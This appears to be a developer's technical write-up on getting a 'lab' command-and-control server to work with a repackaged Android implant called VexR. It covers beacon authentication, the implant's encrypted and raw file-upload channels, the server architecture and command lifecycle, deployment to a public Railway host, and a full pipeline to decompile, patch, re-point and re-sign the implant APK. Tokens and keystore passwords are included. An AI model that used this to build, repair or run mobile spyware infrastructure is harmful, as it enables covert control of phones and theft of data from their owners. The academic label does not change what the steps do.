# VexR lab C2 — root causes and architecture

Everything here was proven from the built DEX, the live server logs, or a
failing request reproduced locally. Nothing is inferred from the source alone.

---

## Part 1 — Why the phone never appeared (solved)

### Symptom

```
warn | unauthorized beacon rejected from 100.64.0.11
```

### Cause

The installed build resolved its token through `NativeSecurity.getAuthToken()`,
whose native branch returns the offensive token. The DEX fallback was already
patched, but `isLoaded` was true because the running APK still had the original
`loadNativeLibrary()`.

| fingerprint | value |
|---|---|
| `len=26 sha256=82baed93…` | `VexR_Auth_99x_2026_Secured` — what the phone sent |
| `len=28 sha256=2958fa5b…` | `VexR_Lab_Academic_Token_2026` — what the server expected |

### Fix

`analysis/harden_native.py` rewrites the three `NativeSecurity` getters to call
`InternalResolver` unconditionally, removing the native branch entirely.

---

## Part 2 — Why `KeyError('k')` appeared (solved)

### Symptom

```
error | decrypt failed: 'k' | keys=[d,i,v] body_len=17 k_len=0
```

### Cause

`sp0.d` calls `SecurityRuntime.decode(sp0.g.getValue())`, i.e. `ky(5)`, then
hands the result to `wg1.a()` as a Base64 X.509 key. The lab patch had `ky(5)`
return raw DER bytes, so `decode()` XORed the DER with `VexR_2026` and produced
non-ASCII garbage. `wg1.a()` threw, returned null, and `sp0.e` emitted `&k=`
with no value.

### Fix — and a second bug found underneath it

`analysis/fix_pubkey2.py` makes `ky(5)` read the XOR-encoded key from
`assets/lab_pubkey.bin`.

The first attempt embedded the key as a smali `const-string` of `\uXXXX`
escapes. That **silently corrupted the key**: the XOR output contains `0x00` at
indices 123, 208 and 305 of its 392 bytes, and apktool's assembler mangles
`\u0000`. The built DEX held a corrupted 123-byte prefix, so the RSA key never
loaded. Verified by reading the string straight out of `classes.dex`:

```
[*] first 123 bytes found at dex offset 202
[*] bytes following in dex: c080600f3f2b...
[*] wanted next 40 bytes : 00600f3f2b57...
```

Binary assets round-trip byte-for-byte, NULs included, so the key ships as an
asset instead.

---

## Part 3 — Why commands returned nothing (solved)

### Symptom

A command was queued, the phone received it, and no result ever appeared. The
`Files received` counter stayed at zero.

### Cause — the important one

The implant has **two** uplink paths and they encrypt differently:

| method | endpoint | body |
|---|---|---|
| `sp0.e()` | `/panel.php` | `v=3&d=&k=&i=` envelope |
| `sp0.f()` | `/file.php` | **the raw file bytes, unencrypted** |

`sp0.f()` is what every command result uses:

```smali
new-instance v1, La/ql0;              # RequestBody.create(mediaType, file)
invoke-direct {v1, v0, p1}, ...
invoke-virtual {p1, p0, v1}, La/s2;->o(...)   # POST
```

No `wg1.a()`, no `wg1.b()`, no envelope. The old `/file.php` handler called
`crypto.decrypt()` unconditionally, threw `KeyError('k')`, and discarded the
body. Reproduced exactly:

```
$ curl -X POST '/file.php?p=EeILBT' -d 'TEST CONTENT'
{"status":"error"}
error | file decrypt failed: 'k'
```

There is a second, related trap in `sp0.e()`. When either crypto step returns
null it jumps to `:cond_6` and **posts the plaintext form anyway**:

```smali
:cond_5
if-eqz v8, :cond_6      # wg1.b() returned null -> skip the envelope
if-eqz v4, :cond_6      # wg1.a() returned null -> skip the envelope
...
:cond_6
... POST p0 ...          # p0 is still the raw form
```

That is the `action=heartbeat&Model=M…` body seen in production. It is not a
bug in the server; it is the implant degrading gracefully.

### Fix

`protocol.py` classifies every uplink body into one of three transports
(`encrypted`, `plain-form`, `raw-file`) before any handler touches it.
`/file.php` stores raw bytes as artifacts instead of trying to decrypt them.

---

## Part 4 — Production issues found during the refactor

### 4a. No persistent volume — every redeploy wiped the data

`railway volume list` returned `No volumes found`. The container filesystem is
ephemeral, so each deploy discarded `vexr_lab.db` and every artifact. Confirmed
when the refactor went live and `devices` went from 1 to 0.

Fixed by attaching a volume at `/data` and having `store.py` prefer it:

```
C2 started · db=/data/vexr_lab.db artifacts=/data/artifacts persistent=True
```

### 4b. `railway up` timed out uploading APKs

15.8 MB of implant binaries sat beside the server and were uploaded on every
deploy, which is what made `railway up` fail with `operation timed out` and
`error decoding response body`. `.railwayignore` now excludes them.

### 4c. Schema migration

The live database predates the refactor. `store.init_db()` adds the new columns
in place and carries the old `files` table into `artifacts`, so no evidence is
lost. It runs on every boot and is idempotent.

---

## Architecture

```
server.py     HTTP routes, operator API
protocol.py   crypto, body classification (the three transports)
store.py      SQLite schema, migrations, artifacts on disk, read models
dashboard.py  operator UI
test_protocol.py  conformance tests (27 checks)
```

### Uplink contract

| transport | endpoint | auth | storage |
|---|---|---|---|
| `encrypted` | `/panel.php` | `X-Auth-Token` | `beacons` |
| `plain-form` | `/panel.php` | `X-Auth-Token` | `beacons` |
| `raw-file` | `/file.php` | `X-Auth-Token` | `artifacts` + file on disk |

### Command lifecycle

```
queue_command()  -> pending
next beacon      -> sent      (claim_pending_commands)
artifact upload  -> completed (+ artifact_id)
no upload in 15m -> expired
```

The dashboard polls `/api/stats`, which runs the expiry sweep, so a command that
was delivered but never answered stops showing as `sent`.

---

## Rebuilding the APK

```bash
/home/arsham/bin/apktool d -f -o /tmp/build/dec D_Kyt7_lab.apk
python3 -I analysis/harden_native.py   /tmp/build/dec
python3 -I analysis/reencode_config.py /tmp/build/dec \
    "VexR_Lab_Academic_Token_2026" \
    "https://vexr-lab-c2-academic-production.up.railway.app"
python3 -I analysis/fix_pubkey2.py     /tmp/build/dec
/home/arsham/bin/apktool b /tmp/build/dec -o /tmp/build/out.apk
java -jar /home/arsham/bin/uber-apk-signer.jar --apks /tmp/build/out.apk \
    --ks lab_keystore.jks --ksAlias labkey \
    --ksPass labpass123 --ksKeyPass labpass123 --allowResign --overwrite
```

Signing certificate: `647fc7dd10997829a140f3a14ed60bd5593f3253766c0b521da7bb5bd575c26e`

---

## Reference: fingerprints

```bash
python3 -c "import hashlib;print(hashlib.sha256(b'VexR_Auth_99x_2026_Secured').hexdigest()[:16])"
# 82baed93521f627c   <- offensive / native
python3 -c "import hashlib;print(hashlib.sha256(b'VexR_Lab_Academic_Token_2026').hexdigest()[:16])"
# 2958fa5b58d68a01   <- academic / expected
```
